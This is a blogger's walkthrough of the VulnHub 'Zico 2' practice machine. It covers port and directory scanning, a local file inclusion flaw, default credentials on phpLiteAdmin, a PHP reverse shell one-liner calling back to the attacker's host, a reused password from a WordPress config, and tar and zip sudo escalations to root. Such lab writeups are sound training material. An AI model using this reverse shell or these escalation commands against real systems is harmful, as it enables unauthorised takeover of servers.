---
title: "VulnHub: Zico 2"
date: "2020-09-20"
author: frosty
categories:
  - "writeups"
tags:
  - "vulnhub"
---

Zico 2 is rated as an intermediate level box created by [@rafasantos5](https://twitter.com/rafasantos5) posted on [VulnHub](https://www.vulnhub.com/entry/zico2-1,210/). This writeup will detail the steps that I have tried and used to get root access of the target host.

The scenario is that Zico tried to build a website, but wasn't sure exactly how they wanted to do it. In the end, they tried to build their own. Let's see if that was a good idea.

## Enumeration

Naturally, we need to find the IP address of the target host. We'll use `netdiscover` for this. The output of netdiscover shows the IP address of the target host, which we then scan using nmap. The nmap command here just tries to find open ports with the `-p-` flag. We can do more detailed scans after we know the open ports.

```sh
$ sudo netdiscover -r 10.0.2.0/24 -i eth0
10.0.2.12

$ nmap -p- 10.0.2.12
```

![Image](/assets/img/writeups/vulnhub/zico2/image-32.png)

Interesting that we see port `111` and `44249` in addition to the typical `22` and `80` ports. Using the nmap `-A` flag, we try to get some more information out of these.

```sh
$ nmap -p 22,80,111,44249 -A 172.20.1.11
```

![Image](/assets/img/writeups/vulnhub/zico2/image-33.png)

It seems that both of these ports are RPC ports. For now, let's go into HTTP enumeration - after all, Zico built the website on their own...

* * *

### Enumeration: HTTP

The first thing to do would be to navigate to the home page, and have a quick browse. We see that they opened their own shop. It looks like it's still in the development phase. Nevertheless, when scrolling down we see an interesting button to "check out the tools". Why is it interesting? The link seems to have some sort of parameter to load pages `?page=tools.html`

![Image](/assets/img/writeups/vulnhub/zico2/image-34-1024x609.png)

![Image](/assets/img/writeups/vulnhub/zico2/image-35.png)

So we see that tools.html is loaded as the value of parameter `?page=`. Perhaps the web application takes in the parameter and loads the `tools.html` - so I am wondering if this parameter is vulnerable to local file inclusion. We can test it by trying to load the `/etc/passwd`. This is a good one to try because it is standard on all Linux boxes, and it resides outside of the website files. And we see in the screenshot below that the parameter indeed is vulnerable to local file inclusion. I also tried to see if we could exploit this parameter for remote file inclusion but it seems that the parameter was not vulnerable - the requests were not reaching my HTTP server.

![Image](/assets/img/writeups/vulnhub/zico2/image-36-1024x188.png)

Anyways, it seems that we have otherwise exhausted our paths for the website. There is no `/robots.txt` file which could have led us to some other paths. So lets use Gobuster for some automated scanning to find some other endpoints which we might be able to visit.

```sh
$ gobuster dir -w /usr/share/wordlists/dirb/commmon.txt -u http://10.0.2.12/
```

![Image](/assets/img/writeups/vulnhub/zico2/image-37.png)

The first thing that strikes me as interesting would be the `/dbadmin` endpoint, which ends up being a directory which contains a file `/test_db.php` which hosts phpLiteAdmin v1.9.3! It is password protected, but our trusty `admin` password attempt works a treat in this case.

![Image](/assets/img/writeups/vulnhub/zico2/image-38.png)

I have actually seen phpLiteAdmin before when I was studying for my OSCP, so I may know the route to get an initial shell. Nevertheless, we need to test if it will work.

It seems that Zico has not setup phpLiteAdmin -> the default database `test_users` is still present. We see in the admin panel that it is located at `/usr/databases/test_users`. So let's remember that we have LFI on the server. If we can craft a new database with some PHP code, then we should be able to execute it through our LFI vulnerable path. Let's try it!

* * *

## Getting the initial shell

![Image](/assets/img/writeups/vulnhub/zico2/image-39.png)

Thanks to the login page of the admin panel, we see the version of phpLiteAdmin. There is an exploit seen in the [Exploit-DB](https://www.exploit-db.com/exploits/24044). Let's follow the steps!

1. Create a DB named `hack.php`.
2. Create a new table with `<?php phpinfo() ?>`
3. Execute hack.php

![Image](/assets/img/writeups/vulnhub/zico2/image-40.png)

![Image](/assets/img/writeups/vulnhub/zico2/image-41-1024x397.png)

Boom! We have code execution! Alright! Let's try and change this so that we can get a shell of some sort.

Let's edit the `<?php phpinfo() ?>` code to:

```php
<?php $sock = fsockopen("10.0.2.10",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

![Image](/assets/img/writeups/vulnhub/zico2/image-42.png)

![Image](/assets/img/writeups/vulnhub/zico2/image-43.png)

* * *

## Privilege escalation

As we saw in the /etc/passwd LFI exploit earlier, we know that there is a Zico user on the host. When inspecting their home directory, we see that there are incorrect permissions set - the files are globally readable and executable

![Image](/assets/img/writeups/vulnhub/zico2/image-45.png)

We see a `to_do.txt` file in their home directory, let's take a look. Zico still wants to try Joomla, bootstrap (+phpliteadmin) and wordpress. Right now what I'm looking for could be some password which Zico may have reused.

![Image](/assets/img/writeups/vulnhub/zico2/image-46.png)

It seems that Joomla wasn't set up at all/ or I couldn't find a password inside there. However, we see a `wp-config.php` in the Wordpress directory. This one has a password stored:

```txt
sWfCsfJSPV9H3AmQzw8
```

![Image](/assets/img/writeups/vulnhub/zico2/image-47.png)

![Image](/assets/img/writeups/vulnhub/zico2/image-48.png)

* * *

## Privilege Escalation

Of course as we already searched the home directory of Zico, I think that it is unlikely that we will find a root password in there. In any case, it's always good for us to execute `sudo -l` to see what kind of other commands Zico can execute.

![Image](/assets/img/writeups/vulnhub/zico2/image-49.png)

It seems that we have two paths to get root. Zico is allowed to execute both `tar` and `zip` binaries as root, without a password. These are both GTFO binaries, so it should be relatively quick to get the root shell.

### Tar Privilege Escalation

We'll use [this](https://gtfobins.github.io/gtfobins/tar/) resource.

```sh
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![Image](/assets/img/writeups/vulnhub/zico2/image-50.png)

### Zip Privilege Escalation

We'll use [this](https://gtfobins.github.io/gtfobins/zip/) resource.

```txt
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
#
```

![Image](/assets/img/writeups/vulnhub/zico2/image-51.png)
